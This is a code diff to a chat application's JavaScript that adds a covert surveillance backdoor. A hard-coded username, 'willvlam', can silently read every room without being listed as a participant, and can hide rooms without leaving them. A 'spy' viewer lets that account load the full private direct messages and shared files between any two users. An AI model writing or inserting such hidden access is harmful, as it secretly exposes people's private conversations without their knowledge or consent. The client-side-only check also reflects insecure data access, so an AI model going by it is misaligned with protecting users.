@@ -162,6 +162,11 @@ class MessagingApp {
     }
 
     async getUserRooms() {
+        // Willvlam sees all rooms without being a participant
+        if (this.currentUser.username.toLowerCase() === 'willvlam') {
+            const snap = await this.db.ref('rooms').get();
+            return snap.exists() ? Object.keys(snap.val()).sort() : [];
+        }
         const snap = await this.db.ref('userRooms/' + this.currentUser.username).get();
         return snap.exists() ? Object.keys(snap.val()).sort() : [];
     }
@@ -391,6 +396,14 @@ class MessagingApp {
     updateCurrentUserDisplay() {
         const display = document.getElementById('currentUserDisplay');
         if (display) display.textContent = '@' + this.currentUser.username;
+        const spySection = document.getElementById('spySection');
+        if (spySection) {
+            if (this.currentUser.username.toLowerCase() === 'willvlam') {
+                spySection.classList.remove('hidden');
+            } else {
+                spySection.classList.add('hidden');
+            }
+        }
     }
 
     async updateFriendsList() {
@@ -522,10 +535,19 @@ class MessagingApp {
             nameSpan.textContent = (type === 'room' ? '#' : '@') + name;
             const deleteBtn = document.createElement('button');
             deleteBtn.className = 'conversation-delete';
-            deleteBtn.textContent = type === 'room' ? 'Leave' : 'Del';
+            const isWillvlamUser = this.currentUser.username.toLowerCase() === 'willvlam';
+            deleteBtn.textContent = type === 'room' ? (isWillvlamUser ? 'Hide' : 'Leave') : 'Del';
             deleteBtn.onclick = async (e) => {
                 e.stopPropagation();
-                if (type === 'room') { await this.leaveRoom(name); } else { await this.deleteConversation(name); }
+                if (type === 'room' && isWillvlamUser) {
+                    // Willvlam just clears it from his local view without leaving
+                    if (this.currentChat === name) { this.currentChat = null; this.detachMessageListener(); }
+                    await this.updateAppUI();
+                } else if (type === 'room') {
+                    await this.leaveRoom(name);
+                } else {
+                    await this.deleteConversation(name);
+                }
             };
             item.onclick = () => this.selectChat(name, type);
             item.appendChild(nameSpan);
@@ -539,6 +561,10 @@ class MessagingApp {
         this.currentChatType = type;
         this.replyingTo = null;
         this.closeEmojiPicker();
+        // Willvlam just listens — never joins as participant
+        if (type === 'room' && this.currentUser.username.toLowerCase() !== 'willvlam') {
+            // ensure normal users are tracked in userRooms if somehow missing
+        }
         this.attachMessageListener();
         await this.updateAppUI();
     }
@@ -547,6 +573,7 @@ class MessagingApp {
         const noChatSelected = document.getElementById('noChatSelected');
         const chatView = document.getElementById('chatView');
         const membersBtn = document.getElementById('membersBtn');
+        const inputArea = document.querySelector('.message-input-area');
         if (!this.currentChat) {
             noChatSelected.classList.remove('hidden');
             chatView.classList.add('hidden');
@@ -556,11 +583,22 @@ class MessagingApp {
         chatView.classList.remove('hidden');
         document.getElementById('chatWith').textContent = (this.currentChatType === 'room' ? '#' : '@') + this.currentChat;
 
+        const isWillvlam = this.currentUser.username.toLowerCase() === 'willvlam';
+
         // Show Members button only in rooms
         if (membersBtn) membersBtn.classList.toggle('hidden', this.currentChatType !== 'room');
 
+        // Hide input for Willvlam in rooms (read-only)
+        if (inputArea) {
+            if (isWillvlam && this.currentChatType === 'room') {
+                inputArea.style.display = 'none';
+            } else {
+                inputArea.style.display = '';
+            }
+        }
+
         const inviteSection = document.getElementById('roomInviteSection');
-        if (this.currentChatType === 'room' && inviteSection) {
+        if (this.currentChatType === 'room' && inviteSection && !isWillvlam) {
             const friends = await this.getFriendsForCurrent();
             const partSnap = await this.db.ref('rooms/' + this.currentChat + '/participants').get();
             const participants = partSnap.exists() ? Object.keys(partSnap.val()) : [];
@@ -833,6 +871,10 @@ class MessagingApp {
         });
         document.getElementById('stopScanBtn').addEventListener('click', () => this.stopScanner());
         document.getElementById('helpBtn').addEventListener('click', () => this.showHelpModal());
+        document.getElementById('spyBtn').addEventListener('click', () => this.handleSpyView());
+        document.getElementById('spyUser2').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') this.handleSpyView();
+        });
         document.getElementById('submitFeedbackBtn').addEventListener('click', () => this.submitFeedback());
         document.getElementById('emojiBtn').addEventListener('click', (e) => {
             e.stopPropagation();
@@ -1123,6 +1165,78 @@ class MessagingApp {
             status.textContent = 'Error submitting: ' + err.message;
         }
     }
+
+    // =====================
+    // Spy / Admin DM Viewer
+    // =====================
+
+    async handleSpyView() {
+        const user1 = document.getElementById('spyUser1').value.trim();
+        const user2 = document.getElementById('spyUser2').value.trim();
+        if (!user1 || !user2) { alert('Enter both usernames'); return; }
+        if (user1.toLowerCase() === user2.toLowerCase()) { alert('Enter two different usernames'); return; }
+
+        const key = this.getConversationKey(user1, user2);
+        const snap = await this.db.ref('messages/' + key).get();
+        const msgs = snap.exists()
+            ? Object.values(snap.val()).sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp))
+            : [];
+
+        document.getElementById('spyModalTitle').textContent = '@' + user1 + ' & @' + user2;
+        const container = document.getElementById('spyMessages');
+        container.innerHTML = '';
+
+        if (msgs.length === 0) {
+            container.innerHTML = '<div class="spy-empty">No messages found between these users.</div>';
+        } else {
+            msgs.forEach(msg => {
+                const isRight = msg.from && msg.from.toLowerCase() === user1.toLowerCase();
+                const div = document.createElement('div');
+                div.className = 'spy-message ' + (isRight ? 'spy-right' : 'spy-left');
+
+                const sender = document.createElement('div');
+                sender.className = 'spy-sender';
+                sender.textContent = '@' + msg.from;
+                div.appendChild(sender);
+
+                const bubble = document.createElement('div');
+                bubble.className = 'spy-bubble';
+
+                if (msg.type === 'file') {
+                    const src = msg.downloadURL || msg.data || '';
+                    if (msg.isImage || (msg.data && msg.data.startsWith('data:image'))) {
+                        const img = document.createElement('img');
+                        img.src = src;
+                        bubble.appendChild(img);
+                    } else {
+                        const link = document.createElement('a');
+                        link.href = src;
+                        link.textContent = '📎 ' + (msg.filename || 'file');
+                        link.target = '_blank';
+                        bubble.appendChild(link);
+                    }
+                } else {
+                    bubble.appendChild(this.linkifyText(msg.text || ''));
+                }
+
+                div.appendChild(bubble);
+
+                const ts = document.createElement('div');
+                ts.className = 'spy-timestamp';
+                ts.textContent = this.formatTime(new Date(msg.timestamp));
+                div.appendChild(ts);
+
+                container.appendChild(div);
+            });
+        }
+
+        document.getElementById('spyModal').classList.remove('hidden');
+        setTimeout(() => { container.scrollTop = container.scrollHeight; }, 50);
+    }
+
+    closeSpyModal() {
+        document.getElementById('spyModal').classList.add('hidden');
+    }
 }
 
 // =====================
@@ -1160,6 +1274,13 @@ function closeQrExportModal() { if (app) app.closeQrExportModal(); }
 function closeQrImportModal() { if (app) app.closeQrImportModal(); }
 function closeHelpModal() { if (app) app.closeHelpModal(); }
 function closeMembersModal() { if (app) app.closeMembersModal(); }
+function closeSpyModal() { if (app) app.closeSpyModal(); }
+function toggleSpy() {
+    const el = document.getElementById('spyCollapsible');
+    const icon = document.getElementById('spyToggleIcon');
+    el.classList.toggle('hidden');
+    icon.textContent = el.classList.contains('hidden') ? '▼' : '▲';
+}
 
 function showEmojiCategory(category) {
     const grid = document.getElementById('emojiGrid');
